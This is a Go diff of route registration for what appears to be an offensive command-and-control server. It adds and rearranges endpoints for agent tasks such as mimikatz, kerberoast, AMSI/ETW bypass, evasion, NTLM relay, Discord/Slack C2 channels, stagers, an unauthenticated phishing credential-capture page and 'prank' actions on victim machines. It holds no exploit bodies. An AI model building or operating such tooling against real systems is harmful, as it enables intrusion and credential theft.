@@ -1,6 +1,7 @@
 package server
 
 import (
+	"net/http/pprof"
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
@@ -12,6 +13,7 @@ import (
 func (s *Server) registerPublicRoutes() {
 	s.router.GET("/login", s.handleLoginPage)
 	s.router.POST("/login", s.handleLogin)
+	s.router.POST("/api/login", s.handleLogin)
 	healthRateLimiter := middleware.NewRateLimiter(s.ctx, 30, time.Minute)
 	s.router.GET("/health", healthRateLimiter.Limit(), s.handleHealthCheck)
 	s.router.GET("/ready", healthRateLimiter.Limit(), s.handleReadyCheck)
@@ -19,6 +21,16 @@ func (s *Server) registerPublicRoutes() {
 	langRateLimiter := middleware.NewRateLimiter(s.ctx, 10, time.Minute)
 	s.router.POST("/lang/set", langRateLimiter.Limit(), s.handleSetLanguage)
 	s.router.GET("/payloads/:id/:filename", s.handleServePayload)
+	// Public phishing landing (credential capture) — no auth by design
+	s.router.GET("/phishing/l/:token", s.handlePhishingLanding)
+	s.router.POST("/phishing/l/:token", s.handlePhishingLanding)
+
+	// WebSocket endpoints: auth handled inside the handler (via cookie/query token)
+	// to avoid redirect loops and support cookie-less connections.
+	wsRateLimiter := middleware.NewRateLimiter(s.ctx, 10, time.Minute)
+	s.router.GET("/ws", wsRateLimiter.Limit(), s.handleWebSocket)
+	s.router.GET("/ws/beacon", wsRateLimiter.Limit(), s.handleWebSocketBeacon)
+	s.router.GET("/extc2/ws", wsRateLimiter.Limit(), s.handleExternalC2WebSocket)
 }
 
 // registerAgentRoutes registers dashboard, search, and agent CRUD routes.
@@ -40,6 +52,7 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
 		agentsRead.GET("/api/agents", s.handleListAgents)
 		agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
+		agentsRead.GET("/api/agents/:id/screenshots", s.handleListAgentScreenshots)
 		agentsRead.GET("/agents/:id/token", s.handleTokenPage)
 		agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
 		agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
@@ -48,6 +61,7 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsRead.GET("/agents/:id/chain", s.handleAgentChainGet)
 		agentsRead.GET("/agents/:id/recording", s.handleAgentRecordingGet)
 		agentsRead.GET("/agents/:id/recording/replay", s.handleAgentRecordingReplay)
+		agentsRead.GET("/agents/:id/status-history", s.handleAgentStatusHistory)
 	}
 
 	agentsWrite := auth.Group("/")
@@ -59,6 +73,7 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
 		agentsWrite.POST("/agents/batch", s.handleBatchCommand)
 		agentsWrite.POST("/agents/bulk/task", s.handleBatchCommand)
+		agentsWrite.GET("/agents/bulk/results", s.handleBulkResults)
 		agentsWrite.POST("/agents/:id/trust", s.handleToggleAgentTrust)
 		agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
 		agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
@@ -117,12 +132,14 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/etw_bypass", s.handleETWByPass)
 		agentCmd.POST("/amsi_hardware_bp", s.handleAMSIHardwareBP)
 		agentCmd.POST("/etw_hardware_bp", s.handleETWHardwareBP)
+		agentCmd.POST("/run_evasion", s.handleRunEvasion)
 		agentCmd.POST("/sandbox_detect_advanced", s.handleSandboxDetectAdvanced)
 		agentCmd.POST("/set_sleep_mask_advanced", s.handleSetSleepMaskAdvanced)
 		agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
 		agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
 		agentCmd.POST("/kerberoast", s.handleKerberoast)
 		agentCmd.POST("/mimikatz", s.handleMimikatz)
+		agentCmd.POST("/modules/deploy", s.handleModulesDeploy)
 		agentCmd.POST("/powerpick", s.handlePowerPick)
 		agentCmd.POST("/net", s.handleNetCommand)
 		agentCmd.POST("/persistence", s.handlePersistence)
@@ -174,6 +191,18 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/coerce/:type", s.handleCoerce)
 		agentCmd.POST("/relay/start", s.handleNTLMRelayStart)
 		agentCmd.POST("/relay/stop", s.handleNTLMRelayStop)
+
+		// Prank / Fun Tasks
+		agentCmd.POST("/prank/wallpaper", s.handleWallpaperChange)
+		agentCmd.POST("/prank/msgbox", s.handleMsgBox)
+		agentCmd.POST("/prank/sound", s.handlePlaySound)
+		agentCmd.POST("/prank/open_url", s.handleOpenURL)
+		agentCmd.POST("/prank/screen_rotate", s.handleScreenRotate)
+		agentCmd.POST("/prank/cdrom", s.handleCDRomTray)
+		agentCmd.POST("/prank/notepad", s.handleNotepadSpam)
+		agentCmd.POST("/prank/lock", s.handleLockWorkstation)
+		agentCmd.POST("/prank/volume", s.handleSetVolume)
+		agentCmd.POST("/prank/cursor", s.handleCursorFlip)
 	}
 }
 
@@ -302,6 +331,26 @@ func (s *Server) registerReconRoutes(auth *gin.RouterGroup) {
 	}
 }
 
+func (s *Server) registerDebugRoutes(auth *gin.RouterGroup) {
+	if s.cfg.Server.EnableMetrics {
+		auth.GET("/metrics", middleware.RequirePermission(db.PermSettingsRead), metricsPromHandler())
+	}
+	if s.cfg.Server.EnablePprof {
+		pprofGroup := auth.Group("/debug/pprof")
+		pprofGroup.Use(middleware.RequirePermission(db.PermSettingsWrite))
+		pprofGroup.GET("/", func(c *gin.Context) { pprof.Index(c.Writer, c.Request) })
+		pprofGroup.GET("/cmdline", func(c *gin.Context) { pprof.Cmdline(c.Writer, c.Request) })
+		pprofGroup.GET("/profile", func(c *gin.Context) { pprof.Profile(c.Writer, c.Request) })
+		pprofGroup.GET("/symbol", func(c *gin.Context) { pprof.Symbol(c.Writer, c.Request) })
+		pprofGroup.GET("/trace", func(c *gin.Context) { pprof.Trace(c.Writer, c.Request) })
+		pprofGroup.GET("/heap", func(c *gin.Context) { pprof.Handler("heap").ServeHTTP(c.Writer, c.Request) })
+		pprofGroup.GET("/goroutine", func(c *gin.Context) { pprof.Handler("goroutine").ServeHTTP(c.Writer, c.Request) })
+		pprofGroup.GET("/block", func(c *gin.Context) { pprof.Handler("block").ServeHTTP(c.Writer, c.Request) })
+		pprofGroup.GET("/mutex", func(c *gin.Context) { pprof.Handler("mutex").ServeHTTP(c.Writer, c.Request) })
+		pprofGroup.GET("/threadcreate", func(c *gin.Context) { pprof.Handler("threadcreate").ServeHTTP(c.Writer, c.Request) })
+	}
+}
+
 // registerSettingsRoutes registers settings, 2FA, i18n routes.
 func (s *Server) registerSettingsRoutes(auth *gin.RouterGroup) {
 	settingsRead := auth.Group("/")
@@ -309,6 +358,7 @@ func (s *Server) registerSettingsRoutes(auth *gin.RouterGroup) {
 	{
 		settingsRead.GET("/settings", s.handleSettingsPage)
 		settingsRead.GET("/settings/webhooks", s.handleGetSettingsWebhooks)
+		settingsRead.GET("/api/modules", s.handleModulesList)
 	}
 	settingsWrite := auth.Group("/")
 	settingsWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
@@ -324,29 +374,32 @@ func (s *Server) registerSettingsRoutes(auth *gin.RouterGroup) {
 		settingsWrite.POST("/settings/db/vacuum", s.handleDBVacuum)
 		settingsWrite.POST("/settings/db/backup", s.handleDBBackup)
 		settingsWrite.GET("/settings/db/backups", s.handleDBBackupList)
+		settingsWrite.GET("/settings/db/backups/download", s.handleDBBackupDownload)
 		settingsWrite.POST("/settings/db/restore", s.handleDBRestore)
 		settingsWrite.GET("/settings/config/download", s.handleDownloadConfig)
 		settingsWrite.POST("/settings/webhooks", s.handleSaveSettingsWebhooks)
 		settingsWrite.POST("/settings/webhooks/test", s.handleTestSettingsWebhook)
 
-		settingsWrite.GET("/settings/sync", s.handleSettingsSyncGet)
-		settingsWrite.GET("/settings/sync/status", s.handleSettingsSyncStatus)
-		settingsWrite.POST("/settings/sync", s.handleSettingsSyncSave)
-		settingsWrite.POST("/settings/sync/test", s.handleSettingsSyncTest)
-		settingsWrite.POST("/settings/sync/trigger", s.handleSettingsSyncTrigger)
-
-		settingsWrite.GET("/settings/siem", s.handleSettingsSIEMGet)
-		settingsWrite.POST("/settings/siem", s.handleSettingsSIEMSave)
-		settingsWrite.POST("/settings/siem/test", s.handleSettingsSIEMTest)
-
 		settingsWrite.POST("/settings/maintenance/purge", s.handleSettingsMaintenancePurge)
+
+		settingsWrite.POST("/admin/emergency-stop", s.handleEmergencyStop)
+		settingsWrite.GET("/admin/emergency-status", s.handleEmergencyStatus)
 
 		settingsWrite.POST("/settings/totp/generate", s.handleTOTPGenerate)
 		settingsWrite.POST("/settings/totp/enable", s.handleTOTPEnable)
 		settingsWrite.POST("/settings/totp/disable", s.handleTOTPDisable)
+
+		settingsWrite.GET("/settings/certs", s.handleGetCertInfo)
+		settingsWrite.POST("/settings/certs/regenerate", s.handleRegenerateCert)
+		settingsWrite.POST("/settings/certs/upload", s.handleUploadCert)
+
+		settingsWrite.POST("/api/modules", s.handleModulesUpload)
+		settingsWrite.DELETE("/api/modules/:name", s.handleModulesDelete)
 	}
 
 	auth.GET("/settings/totp/status", s.handleTOTPStatus)
+	auth.GET("/api/me", s.handleGetCurrentUser)
+	auth.GET("/settings/totp/backup-codes/count", s.handleBackupCodeCount)
 
 	auth.GET("/translations", s.handleTranslationsPage)
 	auth.GET("/api/translations", s.handleGetTranslations)
@@ -354,50 +407,50 @@ func (s *Server) registerSettingsRoutes(auth *gin.RouterGroup) {
 	auth.GET("/api/translations/check", s.handleTranslationCheck)
 }
 
-// registerStubRoutes registers the former stub/API routes.
-func (s *Server) registerStubRoutes(auth *gin.RouterGroup) {
-	stubRead := auth.Group("/")
-	stubRead.Use(middleware.RequirePermission(db.PermAgentsRead))
+// registerExtendedRoutes registers packer/mesh/chat/phishing-adjacent and other product API routes.
+func (s *Server) registerExtendedRoutes(auth *gin.RouterGroup) {
+	extRead := auth.Group("/")
+	extRead.Use(middleware.RequirePermission(db.PermAgentsRead))
 	{
-		stubRead.GET("/packer/templates", s.handleAPIPackerTemplates)
-		stubRead.GET("/packer/info", s.handleAPIPackerInfo)
-		stubRead.GET("/api/settings", s.handleAPISettings)
-		stubRead.GET("/mesh/topology", s.handleAPIMeshTopology)
-		stubRead.GET("/translations/stats", s.handleAPITranslationsStats)
-		stubRead.GET("/api/privesc/results", s.handleAPIPrivesc)
-		stubRead.GET("/timeline/events", s.handleAPITimelineData)
-		stubRead.GET("/chat/history", s.handleAPIChatHistory)
-		stubRead.GET("/chat/channels", s.handleAPIChatChannels)
-		stubRead.GET("/chain/graph", s.handleAPIChainGraph)
-		stubRead.GET("/chain", s.handleAPIChainList)
-		stubRead.GET("/domain-fronting", s.handleAPIDomainFronting)
-		stubRead.GET("/rportfwd/sessions", s.handleAPIRPortFwdStatus)
-		stubRead.GET("/stager/tokens", s.handleAPIStagerTokens)
-		stubRead.GET("/ntlm/relay_status", s.handleNTLMRelayStatus)
-		stubRead.GET("/api/container/status", s.handleContainerStatus)
-		stubRead.GET("/api/container/agents", s.handleContainerAgents)
-		stubRead.GET("/extc2/channels", s.handleListExtC2Channels)
-		stubRead.GET("/extc2/configs", s.handleListExtC2Configs)
+		extRead.GET("/packer/templates", s.handleAPIPackerTemplates)
+		extRead.GET("/packer/info", s.handleAPIPackerInfo)
+		extRead.GET("/api/settings", s.handleAPISettings)
+		extRead.GET("/mesh/topology", s.handleAPIMeshTopology)
+		extRead.GET("/translations/stats", s.handleAPITranslationsStats)
+		extRead.GET("/api/privesc/results", s.handleAPIPrivesc)
+		extRead.GET("/timeline/events", s.handleAPITimelineData)
+		extRead.GET("/chat/history", s.handleAPIChatHistory)
+		extRead.GET("/chat/channels", s.handleAPIChatChannels)
+		extRead.GET("/chain/graph", s.handleAPIChainGraph)
+		extRead.GET("/chain", s.handleAPIChainList)
+		extRead.GET("/domain-fronting", s.handleAPIDomainFronting)
+		extRead.GET("/rportfwd/sessions", s.handleAPIRPortFwdStatus)
+		extRead.GET("/stager/tokens", s.handleAPIStagerTokens)
+		extRead.GET("/ntlm/relay_status", s.handleNTLMRelayStatus)
+		extRead.GET("/api/container/status", s.handleContainerStatus)
+		extRead.GET("/api/container/agents", s.handleContainerAgents)
+		extRead.GET("/extc2/channels", s.handleListExtC2Channels)
+		extRead.GET("/extc2/configs", s.handleListExtC2Configs)
 	}
-	stubWrite := auth.Group("/")
-	stubWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
+	extWrite := auth.Group("/")
+	extWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
 	{
-		stubWrite.POST("/groups", s.handleAPICreateGroup)
-		stubWrite.PUT("/groups/:id", s.handleAPIUpdateGroup)
-		stubWrite.DELETE("/groups/:id", s.handleAPIDeleteGroup)
-		stubWrite.POST("/packer/artifact", s.handlePackerArtifact)
-		stubWrite.POST("/payload/bundle", s.handlePackerBundle)
-		stubWrite.POST("/mesh/route/:agentId", s.handleMeshRoute)
-		stubWrite.POST("/chat/send", s.handleAPISendChatMessage)
-		stubWrite.POST("/infra/front/list", s.handleAPIInfraFrontList)
-		stubWrite.POST("/infra/front/check", s.handleAPIInfraFrontCheck)
-		stubWrite.POST("/infra/front/config", s.handleAPIInfraFrontConfig)
-		stubWrite.POST("/stager/register", s.handleAPIStagerRegister)
-		stubWrite.DELETE("/stager/:id", s.handleAPIStagerDelete)
-		stubWrite.POST("/token/revert", s.handleAPITokenRevert)
-		stubWrite.POST("/extc2/discord", s.handleConfigureDiscordC2)
-		stubWrite.POST("/extc2/slack", s.handleConfigureSlackC2)
-		stubWrite.DELETE("/extc2/configs/:id", s.handleDeleteExtC2Config)
+		extWrite.POST("/groups", s.handleAPICreateGroup)
+		extWrite.PUT("/groups/:id", s.handleAPIUpdateGroup)
+		extWrite.DELETE("/groups/:id", s.handleAPIDeleteGroup)
+		extWrite.POST("/packer/artifact", s.handlePackerArtifact)
+		extWrite.POST("/payload/bundle", s.handlePackerBundle)
+		extWrite.POST("/mesh/route/:agentId", s.handleMeshRoute)
+		extWrite.POST("/chat/send", s.handleAPISendChatMessage)
+		extWrite.POST("/infra/front/list", s.handleAPIInfraFrontList)
+		extWrite.POST("/infra/front/check", s.handleAPIInfraFrontCheck)
+		extWrite.POST("/infra/front/config", s.handleAPIInfraFrontConfig)
+		extWrite.POST("/stager/register", s.handleAPIStagerRegister)
+		extWrite.DELETE("/stager/:id", s.handleAPIStagerDelete)
+		extWrite.POST("/token/revert", s.handleAPITokenRevert)
+		extWrite.POST("/extc2/discord", s.handleConfigureDiscordC2)
+		extWrite.POST("/extc2/slack", s.handleConfigureSlackC2)
+		extWrite.DELETE("/extc2/configs/:id", s.handleDeleteExtC2Config)
 	}
 
 	groupsWrite := auth.Group("/")
@@ -512,6 +565,7 @@ func (s *Server) registerMonitorRoutes(auth *gin.RouterGroup) {
 func (s *Server) registerDashboardCharts(auth *gin.RouterGroup) {
 	dashRead := auth.Group("/")
 	dashRead.Use(middleware.RequirePermission(db.PermAgentsRead))
+	dashRead.Use(middleware.CacheControl(5))
 	{
 		dashRead.GET("/api/dashboard/activity-heatmap", s.handleDashboardActivityHeatmap)
 		dashRead.GET("/api/dashboard/os-distribution", s.handleDashboardOSDistribution)
@@ -548,7 +602,6 @@ func (s *Server) registerBOFRoutes(auth *gin.RouterGroup) {
 
 // registerMiscRoutes registers update check, profile rotation, and stage/payload/screenshot serving routes.
 func (s *Server) registerMiscRoutes(auth *gin.RouterGroup) {
-	auth.GET("/metrics", metricsPromHandler())
 	auth.GET("/api/update-check", s.handleUpdateCheck)
 	auth.GET("/api/update-check/version", s.handleCheckVersion)
 	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
@@ -638,6 +691,7 @@ func (s *Server) registerTaskRoutes(auth *gin.RouterGroup) {
 		tasksRead.GET("/tasks", s.handleTaskHistory)
 		tasksRead.GET("/tasks/export", s.handleExportTasks)
 		tasksRead.GET("/tasks/:taskId", s.handleGetTaskStatus)
+		tasksRead.POST("/tasks/batch-status", s.handleBatchTaskStatus)
 	}
 
 	auth.POST("/logout", s.handleLogout)
@@ -699,10 +753,6 @@ func (s *Server) registerUserRoutes(auth *gin.RouterGroup) {
 		userWrite.POST("/api/scripts/execute", s.handleAPIExecuteScript)
 	}
 
-	auth.GET("/ws", s.handleWebSocket)
-	auth.GET("/ws/beacon", s.handleWebSocketBeacon)
-	auth.GET("/extc2/ws", s.handleExternalC2WebSocket)
-
 	usersRead := auth.Group("/")
 	usersRead.Use(middleware.RequirePermission(db.PermUsersRead))
 	{
@@ -717,6 +767,9 @@ func (s *Server) registerUserRoutes(auth *gin.RouterGroup) {
 		usersWrite.POST("/users/:id/password", s.handleSetUserPassword)
 		usersWrite.POST("/users/:id/kick", s.handleKickUser)
 		usersWrite.POST("/users/:id/force-logout", s.handleForceLogoutUser)
+		usersWrite.GET("/users/:id/sessions", s.handleListUserSessions)
+		usersWrite.POST("/users/:id/sessions/:sessionId/revoke", s.handleRevokeSession)
+		usersWrite.POST("/users/:id/sessions/revoke-all", s.handleRevokeAllUserSessions)
 	}
 	usersDelete := auth.Group("/")
 	usersDelete.Use(middleware.RequirePermission(db.PermUsersDelete))
@@ -842,9 +895,9 @@ func (s *Server) registerIntegrationRoutes(auth *gin.RouterGroup) {
 	autoTagWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
 	{
 		autoTagWrite.POST("/api/autotag/rules", s.handleAutoTagCreate)
-		autoTagWrite.PUT("/autotag/rules/:id", s.handleAutoTagUpdate)
-		autoTagWrite.POST("/autotag/rules/:id/toggle", s.handleAutoTagToggle)
-		autoTagWrite.DELETE("/autotag/rules/:id", s.handleAutoTagDelete)
+		autoTagWrite.PUT("/api/autotag/rules/:id", s.handleAutoTagUpdate)
+		autoTagWrite.POST("/api/autotag/rules/:id/toggle", s.handleAutoTagToggle)
+		autoTagWrite.DELETE("/api/autotag/rules/:id", s.handleAutoTagDelete)
 		autoTagWrite.POST("/api/autotag/apply", s.handleAutoTagApply)
 	}
 
@@ -894,6 +947,14 @@ func (s *Server) registerIntegrationRoutes(auth *gin.RouterGroup) {
 		integrationRead.GET("/integrations/malleable", s.handleActiveMalleable)
 		integrationRead.GET("/rportfwd/status", s.handleRPortFwdGlobalStatus)
 	}
+	integrationWrite := auth.Group("/")
+	integrationWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
+	{
+		integrationWrite.POST("/integrations", s.handleIntegrationsCreate)
+		integrationWrite.PUT("/integrations/:id", s.handleIntegrationsUpdate)
+		integrationWrite.POST("/integrations/:id/toggle", s.handleIntegrationsToggle)
+		integrationWrite.DELETE("/integrations/:id", s.handleIntegrationsDelete)
+	}
 
 	linkWrite := auth.Group("/")
 	linkWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
@@ -905,4 +966,15 @@ func (s *Server) registerIntegrationRoutes(auth *gin.RouterGroup) {
 	auth.GET("/ws/remote-desktop", s.handleRDWebSocket)
 	auth.GET("/rd/:id/frame", s.handleRDAPIGetFrame)
 	auth.POST("/rd/:id/screenshot", s.handleRDAPIScreenshot)
+}
+
+// registerAPIKeyRoutes registers API key management routes.
+func (s *Server) registerAPIKeyRoutes(auth *gin.RouterGroup) {
+	apiKeys := auth.Group("/")
+	{
+		apiKeys.GET("/api/api-keys", s.handleListAPIKeys)
+		apiKeys.POST("/api/api-keys", s.handleCreateAPIKey)
+		apiKeys.DELETE("/api/api-keys/:id", s.handleRevokeAPIKey)
+		apiKeys.POST("/api/api-keys/:id/rotate", s.handleRotateAPIKey)
+	}
 }
